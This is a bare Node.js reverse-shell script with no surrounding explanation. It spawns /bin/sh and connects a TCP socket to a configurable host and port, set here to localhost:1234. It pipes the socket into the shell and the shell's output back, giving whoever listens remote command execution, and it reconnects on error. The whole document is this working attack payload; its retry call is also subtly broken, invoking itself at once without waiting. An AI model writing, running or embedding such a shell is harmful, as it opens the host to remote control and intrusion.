var net = require('net'),
spawn = require('child_process').spawn,
sh = spawn('/bin/sh',[]);

HOST="localhost";
PORT="1234";
TIMEOUT="5000";

function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        client.write("Connected\r\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}

c(HOST,PORT);
